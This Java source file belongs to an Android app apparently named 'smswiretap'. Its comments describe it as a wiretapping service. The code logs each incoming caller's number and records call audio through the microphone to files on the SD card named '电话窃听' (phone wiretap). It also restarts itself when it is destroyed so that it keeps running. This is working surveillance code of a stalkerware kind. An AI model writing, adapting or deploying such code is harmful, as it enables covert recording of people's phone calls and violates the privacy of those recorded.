package com.ckz.smswiretap.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.ckz.smswiretap.utils.ServiceTools;

/**
 * 开启服务进行监听短信或通话状态
 *
 * @author Administrator
 *
 */
@SuppressLint("SdCardPath")
public class StartService extends Service {

	private static final String TAG = "StartService";

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		super.onCreate();
		Log.i(TAG, "窃听服务被创建....");
		Toast.makeText(this, "窃听服务被创建....", Toast.LENGTH_SHORT).show();
		// 获取系统电话服务
		TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		tm.listen(new myPhoneStateListener(),PhoneStateListener.LISTEN_CALL_STATE);
	}

	/**
	 * 电话监听器
	 * @author Administrator
	 *
	 */
	private class myPhoneStateListener extends PhoneStateListener {
		private MediaRecorder recorder;

		/*
		 * (non-Javadoc)
		 * 
		 * @see android.telephony.PhoneStateListener#onCallStateChanged(int,
		 * java.lang.String)
		 */
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
					case TelephonyManager.CALL_STATE_IDLE:// 空闲状态，没有通话，没有响铃
						if (recorder != null) {
							recorder.stop();
							recorder.reset(); // You can reuse the object by going back to setAudioSource() step
							recorder.release(); // Now the object cannot be reused
							recorder=null;
						}
						break;

					case TelephonyManager.CALL_STATE_RINGING:// 响铃状态
						Log.i(TAG, "发现来电号码：" + incomingNumber);
						Toast.makeText(StartService.this, "发现来电号码："+ incomingNumber, Toast.LENGTH_SHORT).show();
						// 创建一个媒体录音机
						recorder = new MediaRecorder();
						//设置录制的音频源，从话筒里获取声音
						//录制通话的上下行音频源，VOICE_UPLINK、VOICE_DOWNLINK。需要支持，原版android都不支持
						//权限：android.permission.RECORD_AUDIO
						recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
						recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
						recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
						//权限：android.permission.WRITE_EXTERNAL_STORAGE
						recorder.setOutputFile("/sdcard/" + System.currentTimeMillis()
								+ "电话窃听.3gp");
						recorder.prepare();
						break;
					case TelephonyManager.CALL_STATE_OFFHOOK:// 通话状态
						if (recorder != null) {
							recorder.start(); // Recording is now started
						}
						break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			super.onCallStateChanged(state, incomingNumber);
		}

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();
		try {
			//待会完全销毁
			Thread.sleep(500);
			Log.i(TAG, "窃听服务被销毁，重新开户服务....");
			Toast.makeText(this, "窃听服务被销毁，重新开户服务....", Toast.LENGTH_SHORT).show();
			boolean b = ServiceTools.isServiceRunning(this, "com.ckz.smswiretap.service.StartService");
			if(!b){
				Intent intent = new Intent(this, StartService.class);
				startService(intent);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
